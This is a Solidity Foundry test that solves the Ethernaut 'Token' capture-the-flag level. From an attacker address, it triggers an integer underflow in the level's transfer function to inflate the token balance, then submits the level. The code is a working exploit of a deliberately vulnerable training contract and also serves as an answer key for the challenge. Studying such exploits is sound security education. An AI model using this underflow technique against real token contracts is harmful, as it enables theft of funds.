// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/05-Token/TokenFactory.sol";

contract BaseSetUp is Test {
    Ethernaut ethernaut;
    address payable attacker;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attacker = payable(vm.addr(1));      
        vm.deal(attacker, 10 ether);
        vm.label(attacker, "Attacker");
    }
}

contract Attack is BaseSetUp {

    Token ethernautToken;
    address payable levelAddress;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);

        vm.prank(attacker);
        levelAddress = payable(ethernaut.createLevelInstance(tokenFactory));
        ethernautToken = Token(levelAddress);
        console.log("Ethernaut Token Challenge!");
    }

    function testAttack() public {

        uint initialBalance = ethernautToken.balanceOf(attacker);
        emit log_named_uint("Tokens", initialBalance);
        
        // Exploit contract by causing underflow
        vm.prank(attacker);
        bool success = ethernautToken.transfer(address(0), initialBalance + 1);

        uint newBalance = ethernautToken.balanceOf(attacker);
        emit log_named_uint("Tokens", newBalance);
        assert (newBalance > initialBalance);

        // Submit Level
        vm.prank(attacker);
        bool passedLevel = ethernaut.submitLevelInstance(levelAddress);
        assert(passedLevel);
    }
}